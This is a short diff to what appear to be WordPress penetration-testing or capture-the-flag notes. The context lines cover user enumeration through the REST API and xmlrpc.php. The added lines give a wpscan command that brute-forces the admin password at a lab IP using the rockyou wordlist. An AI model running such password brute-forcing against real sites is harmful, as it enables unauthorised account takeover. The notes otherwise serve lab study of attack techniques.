@@ -13,6 +13,8 @@ This issue will only acceptable when target website is hiding their current user
 - ?rest_route=/wp/v2/users
 You will see json data with user info in response
 ````
+### Bruteforce for password
+`wpscan --url http://10.10.23.231/blog --usernames admin --passwords /usr/share/wordlists/rockyou.txt  --max-threads 100`
 
 #### xmlrpc.php
 send the post request with the following data
